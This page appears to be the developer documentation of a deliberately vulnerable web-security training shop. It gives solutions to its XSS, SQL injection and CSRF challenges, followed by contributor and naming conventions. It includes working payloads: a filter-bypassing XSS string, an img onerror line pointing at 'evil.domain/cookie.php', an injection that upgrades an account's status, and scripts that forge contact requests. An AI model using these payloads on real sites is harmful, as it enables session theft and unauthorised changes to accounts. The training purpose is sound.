    * Solution for all browsers: &lt;ScRiPt&gt;alert(document.cookie&lt;ScRiPt&gt;
    */</span>

    <span class="token comment">// additionally filter &apos;alert&apos; command</span>
    <span class="token variable">$filteredComment</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;alert&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$filteredComment</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// add filtered comment to database</span>
    <span class="token function">add_comment_to_db</span><span class="token punctuation">(</span><span class="token variable">$filteredComment</span><span class="token punctuation">,</span> <span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">&apos;userName&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</pre><p>To circumvent this restrictions, the user can rely an a different HTML tag like <code>&lt;img&gt;</code> and use another JavaScript dialog function like <code>confirm()</code>.</p>
<pre data-role="codeBlock" data-info="html" class="language-html">&lt;img src=&quot;&quot; onerror=javascript:confirm(&apos;evil.domain/cookie.php?c=&apos; + document)&gt;
</pre><p>The user could also use the <code>document.write</code> function.</p>
<h3 class="mume-header" id="sql-injection">SQL Injection</h3>

<p>The SQLi challenge is located in the <code>friends.php</code> file.</p>
<p><strong>Challenge</strong>: In this challenge the user should exploit a search field and a SQLite database. The task is to upgrade the user account to a premium membership.</p>
<p>The search field queries the &apos;users&apos; table of the SQLite database which stores username, password, email, whish list and user status for every entry. The database is filled with a set of fake users and an entry for the corresponding user.</p>
<pre data-role="codeBlock" data-info="sql" class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> email<span class="token punctuation">,</span> wishlist <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">&apos;&lt;search&gt;&apos;</span><span class="token punctuation">;</span>
</pre><p><strong>Solution</strong>: To solve this challenge the user needs to inject a SQL query that updates the users premium status in the database. An example could look like this:</p>
<pre data-role="codeBlock" data-info="sql" class="language-sql"><span class="token string">&apos;; UPDATE users SET user_status = &apos;</span>premium<span class="token string">&apos; WHERE username = &apos;</span><span class="token operator">&lt;</span><span class="token keyword">user</span><span class="token operator">&gt;</span>&apos;<span class="token punctuation">;</span><span class="token comment">--</span>
</pre><p>The <code>&apos;;</code> closes off the original SELECT query. The <code>--</code> at the end comments out all remaining parts of the initial query.</p>
<p><strong>Difficulty</strong>: On hard difficulty the premium status is no longer stored directly in the users table but in a separat table. To find this table, the user needs to query the sqlite_master table.</p>
<pre data-role="codeBlock" data-info="sql" class="language-sql">&apos;<span class="token punctuation">;</span> <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> sqlite_master<span class="token punctuation">;</span><span class="token comment">--</span>
</pre><p>Furthermore, the input length for the search field is limited by the HTML attribute <code>maxlength</code>. The user has to manually increase this limit to enter SQL statements longer than 10 characters.</p>
<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>10<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</pre><h3 class="mume-header" id="cross-site-request-forgery">Cross Site Request Forgery</h3>

<p>The CSRF challenge is located in the <code>contact.php</code> file.</p>
<p><strong>Challenge</strong>: In this challenge the user should send a support request to the closed contact form. In addition, the request should look like it was send by the fake user &apos;Elliot&apos;.</p>
<p><strong>Solution</strong>: This challenge can be solved in three different ways. The easiest option is to manipulate the product comment form on <code>product.php</code> with the browser inspector to include the same input names as the closed contact form.</p>
<p>The product comment field could also be manipulated with JavaScript:</p>
<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript">
<span class="token keyword">var</span> frm <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&apos;CSRForm&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
frm<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token string">&quot;contact.php&quot;</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&apos;challengeUsername&apos;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token operator">=</span><span class="token string">&quot;elliot&quot;</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&apos;challengePost&apos;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">&quot;userPost&quot;</span><span class="token punctuation">;</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</pre><p>Another way to solve this challenge would be to send an AJAX request via one of the fields that are vulnerable to XSS attacks:</p>
<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript">
<span class="token keyword">const</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;contact.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Content-type&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;application/x-www-form-urlencoded&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">&quot;uname=elliot&amp;userPost=pwned&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</pre><p><strong>Difficulty</strong>: On hard difficulty the user needs to send a user specific token with the support request. This token can be obtained for the user Elliot from the SQLite database during the SQLi challenge.</p>
<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ScRiPt</span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript">
<span class="token keyword">const</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;contact.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Content-type&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;application/x-www-form-urlencoded&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">&quot;uname=elliot&amp;userPost=pwned&amp;utoken=&lt;token&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ScRiPt</span><span class="token punctuation">&gt;</span></span>
</pre><h2 class="mume-header" id="adding-new-challenges">Adding New Challenges</h2>

<p>If you add new challenges to the shop, please consider the following points in order to keep the project consistent:</p>
<ul>
<li>New challenges should be added on separat pages</li>
<li>A challenge page should be stored in <strong>public/shop/</strong></li>
<li>All challenge related functions should be stored in <code>websec_functions.php</code></li>
<li>Increase the number of challenges in <code>config.php</code></li>
<li>A reset functionality for the new challenge must also be added.</li>
</ul>
<h2 class="mume-header" id="naming-conventions">Naming Conventions</h2>

<p>The following naming conventions should be used throughout the project.</p>
<p><strong>Variables</strong>: <code>variableName</code></p>
<p><strong>Constants</strong>: <code>CONSTANT_NAME</code></p>
<p><strong>Methods / Functions</strong>: <code>method_name</code></p>
<p><strong>CSS Classes</strong>: <code>class-name</code></p>
<p><strong>CSS IDs</strong>: <code>idName</code></p>
<p><strong>HTML Fields etc.</strong>: <code>field-name</code></p>
<p><strong>DB Fields</strong>: <code>[table]_field_name</code></p>
<p><strong>PHP Files</strong>: <code>file_name.php</code></p>
<p><strong>Other (Asset) Files</strong>: <code>file_name.ending</code></p>

      </div>
      
      
    
    
    
    
    
    
    
    
  
    </body></html>